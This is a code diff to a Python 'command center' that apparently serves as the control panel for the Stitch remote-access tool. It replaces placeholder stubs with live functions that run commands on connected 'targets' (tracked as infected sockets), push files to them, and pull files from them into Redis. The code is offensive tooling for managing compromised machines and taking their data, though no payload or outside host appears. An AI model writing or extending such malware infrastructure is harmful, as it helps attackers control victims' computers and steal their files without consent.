@@ -29,7 +29,7 @@ import logging
 sys.path.insert(0, '/workspace')
 
 try:
-    from Application.stitch_cmd import get_stitch_server
+    from web_app_real import get_stitch_server
     from Core.elite_executor import EliteCommandExecutor
     from websocket_extensions import register_websocket_events
     STITCH_AVAILABLE = True
@@ -160,7 +160,7 @@ class StrategicCommandCenter:
                 time.sleep(5)
     
     def _update_target_health(self):
-        """Update target health information"""
+        """Update target health information using real Stitch connections"""
         if not self.stitch_server:
             return
         
@@ -171,19 +171,34 @@ class StrategicCommandCenter:
         for target_id in self.stitch_server.inf_sock.keys():
             active_targets.add(target_id)
             
+            # Get real target information from Stitch
+            target_info = self._get_real_target_info(target_id)
+            
             # Update or create target info
             if target_id not in self.targets:
                 self.targets[target_id] = TargetInfo(
                     id=target_id,
-                    ip=target_id,
-                    hostname=f"target-{target_id}",
-                    os="Unknown",
+                    ip=target_info.get('ip', target_id),
+                    hostname=target_info.get('hostname', f"target-{target_id}"),
+                    os=target_info.get('os', 'Unknown'),
                     status="online",
-                    last_seen=current_time
+                    last_seen=current_time,
+                    cpu_percent=target_info.get('cpu_percent', 0.0),
+                    memory_percent=target_info.get('memory_percent', 0.0),
+                    network_speed=target_info.get('network_speed', 0.0),
+                    health_score=target_info.get('health_score', 100),
+                    connection_type=target_info.get('connection_type', 'tcp'),
+                    capabilities=target_info.get('capabilities', [])
                 )
             else:
-                self.targets[target_id].last_seen = current_time
-                self.targets[target_id].status = "online"
+                # Update existing target
+                target = self.targets[target_id]
+                target.last_seen = current_time
+                target.status = "online"
+                target.cpu_percent = target_info.get('cpu_percent', target.cpu_percent)
+                target.memory_percent = target_info.get('memory_percent', target.memory_percent)
+                target.network_speed = target_info.get('network_speed', target.network_speed)
+                target.health_score = target_info.get('health_score', target.health_score)
         
         # Mark disconnected targets as offline
         for target_id, target in self.targets.items():
@@ -208,6 +223,26 @@ class StrategicCommandCenter:
         
         # Emit WebSocket updates
         self._emit_target_update()
+    
+    def _get_real_target_info(self, target_id: str) -> Dict[str, Any]:
+        """Get real target information from Stitch system"""
+        try:
+            # Get target information from the real Stitch system
+            from web_app_real import get_target_info
+            return get_target_info(target_id)
+        except Exception as e:
+            logger.error(f"Error getting target info for {target_id}: {e}")
+            return {
+                'ip': target_id,
+                'hostname': f"target-{target_id}",
+                'os': 'Unknown',
+                'cpu_percent': 0.0,
+                'memory_percent': 0.0,
+                'network_speed': 0.0,
+                'health_score': 100,
+                'connection_type': 'tcp',
+                'capabilities': []
+            }
     
     def _store_targets_in_redis(self):
         """Store target information in Redis"""
@@ -276,7 +311,7 @@ class StrategicCommandCenter:
             logger.error(f"File queue processing error: {e}")
     
     def _execute_command_async(self, command_info: Dict[str, Any]):
-        """Execute command asynchronously"""
+        """Execute command asynchronously using real Stitch system"""
         try:
             target_id = command_info.get('target_id')
             command = command_info.get('command')
@@ -287,12 +322,31 @@ class StrategicCommandCenter:
             
             start_time = time.time()
             
-            # Execute command using elite executor
-            if self.elite_executor and command in self.elite_executor.get_available_commands():
-                result = self.elite_executor.execute(command, **parameters)
+            # Execute command using real Stitch system
+            if self.stitch_server and target_id in self.stitch_server.inf_sock:
+                try:
+                    # Import the real command execution function
+                    from web_app_real import execute_real_command
+                    output = execute_real_command(command, target_id, parameters)
+                    
+                    result = {
+                        'success': True,
+                        'output': output,
+                        'error': ''
+                    }
+                except Exception as e:
+                    result = {
+                        'success': False,
+                        'output': '',
+                        'error': str(e)
+                    }
             else:
-                # Fallback to basic execution
-                result = self._execute_basic_command(target_id, command, parameters)
+                # Target not connected
+                result = {
+                    'success': False,
+                    'output': '',
+                    'error': f'Target {target_id} is not connected'
+                }
             
             execution_time = time.time() - start_time
             
@@ -390,18 +444,62 @@ class StrategicCommandCenter:
             logger.error(f"File operation execution error: {e}")
     
     def _handle_file_upload(self, file_op: FileOperation):
-        """Handle file upload operation"""
+        """Handle file upload operation using real Stitch system"""
         file_op.status = "in_progress"
-        # Implementation would go here
-        file_op.status = "completed"
-        file_op.progress = 100.0
+        try:
+            if self.stitch_server and file_op.target_id in self.stitch_server.inf_sock:
+                # Import the real file upload function
+                from web_app_real import upload_file_to_target
+                
+                # Get file content from Redis
+                file_data = self.redis_client.get(f"file_content_{file_op.target_id}_{file_op.filename}")
+                if file_data:
+                    file_content = bytes.fromhex(file_data)
+                    result = upload_file_to_target(file_op.target_id, file_op.filename, file_content, file_op.path)
+                    
+                    if result.get('success'):
+                        file_op.status = "completed"
+                        file_op.progress = 100.0
+                    else:
+                        file_op.status = "failed"
+                        file_op.progress = 0.0
+                else:
+                    file_op.status = "failed"
+                    file_op.progress = 0.0
+            else:
+                file_op.status = "failed"
+                file_op.progress = 0.0
+        except Exception as e:
+            logger.error(f"File upload error: {e}")
+            file_op.status = "failed"
+            file_op.progress = 0.0
     
     def _handle_file_download(self, file_op: FileOperation):
-        """Handle file download operation"""
+        """Handle file download operation using real Stitch system"""
         file_op.status = "in_progress"
-        # Implementation would go here
-        file_op.status = "completed"
-        file_op.progress = 100.0
+        try:
+            if self.stitch_server and file_op.target_id in self.stitch_server.inf_sock:
+                # Import the real file download function
+                from web_app_real import download_file_from_target
+                
+                result = download_file_from_target(file_op.target_id, file_op.path)
+                
+                if result.get('success'):
+                    file_op.status = "completed"
+                    file_op.progress = 100.0
+                    # Store file content in Redis
+                    if 'content' in result:
+                        self.redis_client.set(f"file_content_{file_op.target_id}_{file_op.filename}", result['content'].hex())
+                else:
+                    file_op.status = "failed"
+                    file_op.progress = 0.0
+            else:
+                file_op.status = "failed"
+                file_op.progress = 0.0
+        except Exception as e:
+            logger.error(f"File download error: {e}")
+            file_op.status = "failed"
+            file_op.progress = 0.0
     
     def _handle_file_delete(self, file_op: FileOperation):
         """Handle file delete operation"""
